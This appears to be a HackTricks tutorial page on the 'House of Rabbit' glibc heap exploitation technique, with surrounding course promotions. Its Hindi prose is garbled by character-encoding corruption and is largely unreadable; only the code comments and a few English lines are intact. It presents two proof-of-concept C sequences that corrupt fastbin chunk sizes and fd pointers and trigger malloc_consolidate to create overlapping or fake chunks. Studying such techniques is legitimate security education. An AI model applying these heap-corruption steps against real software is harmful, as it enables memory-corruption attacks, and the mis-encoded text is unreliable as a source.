# House of Rabbit

{% hint style="success" %}
рдПрдбрдмреНрд▓реНрдпреВрдПрд╕ рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг рдПрдбрдмреНрд▓реНрдпреВрдПрд╕ рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рдЬреАрд╕реАрдкреА рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдкреНрд░реИрдХреНрдЯрд┐рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг рдЬреАрд╕реАрдкреА рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕**](https://github.com/carlospolop/hacktricks) рдФрд░ [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}

### рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ

1. **рдлрд╛рд╕реНрдЯ рдмрд┐рди рдПрдлрдбреА рдкреЙрдЗрдВрдЯрд░ рдпрд╛ рд╕рд╛рдЗрдЬрд╝ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛**: рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдлрд╛рд╕реНрдЯрдмрд┐рди рдореЗрдВ рдПрдХ рдЪрдВрдХ рдХреЗ рдлреЙрд░рд╡рд░реНрдб рдкреЙрдЗрдВрдЯрд░ рдпрд╛ рдЙрд╕рдХрд╛ рд╕рд╛рдЗрдЬрд╝ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред
2. **`malloc_consolidate` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛**: рдЗрд╕реЗ рдмрдбрд╝реЗ рдЪрдВрдХ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдХреЗ рдпрд╛ рд╢реАрд░реНрд╖ рдЪрдВрдХ рдХреЛ рдорд░реНрдЬ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣реАрдк рдХреЛ рдЪрдВрдХ рдХреЛ рд╕рдореЗрдЯрдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### рд▓рдХреНрд╖реНрдп

1. **рдУрд╡рд░рд▓реИрдкрд┐рдВрдЧ рдЪрдВрдХ рдмрдирд╛рдПрдВ**: рдПрдХ рдЪрдВрдХ рдХреЛ рджреВрд╕рд░реЗ рдХреЗ рд╕рд╛рде рдУрд╡рд░рд▓реИрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЬрд┐рд╕рд╕реЗ рдФрд░ рд╣реАрдк рдореЗрдирд┐рдкреБрд▓реЗрд╢рди рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛред
2. **рдлрд░реНрдЬреА рдЪрдВрдХ рдмрдирд╛рдПрдВ**: рдПрдХ рдлрд░реНрдЬреА рдЪрдВрдХ рдХреЛ рдПрдХ рд╡реИрдз рдЪрдВрдХ рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрд▓реЛрдХреЗрдЯрд░ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдПред

## рд╣рдорд▓реЗ рдХреЗ рдЪрд░рдг

### POC 1: рдПрдХ рдлрд╛рд╕реНрдЯ рдмрд┐рди рдЪрдВрдХ рдХрд╛ рд╕рд╛рдЗрдЬрд╝ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ

**рдЙрджреНрджреЗрд╢реНрдп**: рдПрдХ рдУрд╡рд░рд▓реИрдкрд┐рдВрдЧ рдЪрдВрдХ рдмрдирд╛рдПрдВ, рдЬрд┐рд╕реЗ рдлрд╛рд╕реНрдЯрдмрд┐рди рдЪрдВрдХ рдХреЗ рд╕рд╛рдЗрдЬрд╝ рдХреЛ рдорд╛рдирд┐рдкреБрд▓реЗрдЯ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

* **рдЪрд░рдг 1: рдЪрдВрдХ рдЖрд╡рдВрдЯрд┐рдд рдХрд░реЗрдВ**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **рдХрджрдо 2: рдЪрдВрдХреНрд╕ рдХреЛ рдореБрдХреНрдд рдХрд░реЗрдВ**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **рдЪрд░рдг 3: рдЪрдВрдХ рдХрд╛ рдЖрдХрд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **рдЪрд░рдг 4: `malloc_consolidate` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
рдПрдХ рдмрдбрд╝реЗ рдЪрдВрдХ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдиреЗ рд╕реЗ `malloc_consolidate` рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдлрд╛рд╕реНрдЯ рдмрд┐рди рдореЗрдВ рдЫреЛрдЯреЗ рдЪрдВрдХ рдХреЛ рдорд░реНрдЬ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред `chunk1` рдХрд╛ рдордирд┐рдкреБрд▓реЗрдЯреЗрдб рд╕рд╛рдЗрдЬрд╝ `chunk2` рдХреЗ рд╕рд╛рде рдУрд╡рд░рд▓реИрдк рд╣реЛрдиреЗ рдХрд╛ рдХрд╛рд░рдг рдмрдирддрд╛ рд╣реИред

рдХрдВрд╕реЛрд▓рд┐рдбреЗрд╢рди рдХреЗ рдмрд╛рдж, `chunk1` `chunk2` рдХреЗ рд╕рд╛рде рдУрд╡рд░рд▓реИрдк рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЖрдЧреЗ рдХреА рдЙрддреНрдкреАрдбрд╝рди рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

### POC 2: `fd` рдкреЙрдЗрдВрдЯрд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ

**рдЙрджреНрджреЗрд╢реНрдп**: рдлрд╛рд╕реНрдЯ рдмрд┐рди `fd` рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдордирд┐рдкреБрд▓реЗрдЯ рдХрд░рдХреЗ рдПрдХ рдирдХрд▓реА рдЪрдВрдХ рдмрдирд╛рдПрдВред

* **рдЪрд░рдг 1: рдЪрдВрдХреНрд╕ рдХрд╛ рдЖрд╡рдВрдЯрди рдХрд░реЗрдВ**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг**: рд╣рдо рджреЛ рдЪрдВрдХ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдПрдХ рдЫреЛрдЯрд╛ рдФрд░ рдПрдХ рдмрдбрд╝рд╛, рддрд╛рдХрд┐ рд╣реИрдк рдХреЛ рдлреЗрдХ рдЪрдВрдХ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

* **рдЪрд░рдг 2: рдлреЗрдХ рдЪрдВрдХ рдмрдирд╛рдПрдВ**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **рдХрджрдо 3: `chunk1` рдХреЛ рдореБрдХреНрдд рдХрд░реЗрдВ**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг**: рд╣рдо `chunk1` рдХреЛ рдореБрдХреНрдд рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕реЗ рддреНрд╡рд░рд┐рдд рдмрд┐рди рд╕реВрдЪреА рдореЗрдВ рдЬреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

* **рдЪрд░рдг 4: `chunk1` рдХреЗ `fd` рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг**: рд╣рдо `chunk1` рдХреЗ рдлреЙрд░рд╡рд░реНрдб рдкреЙрдЗрдВрдЯрд░ (`fd`) рдХреЛ рд╣рдорд╛рд░реЗ рдлрд░реНрдЬреА рдЪрдВрдХ рдХреА рдУрд░ рдкрд╣реБрдВрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓рддреЗ рд╣реИрдВ `chunk2` рдХреЗ рдЕрдВрджрд░ред

* **рдЪрд░рдг 5: `malloc_consolidate` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Allocating a large chunk again triggers `malloc_consolidate`, which processes the fake chunk.

The fake chunk becomes part of the fastbin list, making it a legitimate chunk for further exploitation.

### рд╕рд╛рд░рд╛рдВрд╢

**House of Rabbit** рддрдХрдиреАрдХ рдореЗрдВ рдпрд╛ рддреЛ рдПрдХ рдлрд╛рд╕реНрдЯ рдмрд┐рди рдЪрдВрдХ рдХрд╛ рдЖрдХрд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдУрд╡рд░рд▓реИрдкрд┐рдВрдЧ рдЪрдВрдХ рдмрдирд╛рдиреЗ рдпрд╛ `fd` рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдореЛрдбрд┐рдлрд╛рдИ рдХрд░рдХреЗ рдлреЗрдХ рдЪрдВрдХ рдмрдирд╛рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рд╣реАрдк рдореЗрдВ рд╡реИрдз рдЪрдВрдХ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рд╢реЛрд╖рдг рд╕рдВрднрд╛рд╡рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред рдЗрди рдЪрд░рдгреЛрдВ рдХреЛ рд╕рдордЭрдирд╛ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░рдирд╛ рдЖрдкрдХреЗ рд╣реАрдк рд╢реЛрд╖рдг рдХреМрд╢рд▓ рдХреЛ рдмрдврд╝рд╛рдПрдЧрд╛ред

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕**](https://github.com/carlospolop/hacktricks) рдФрд░ [**рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
{% endhint %}
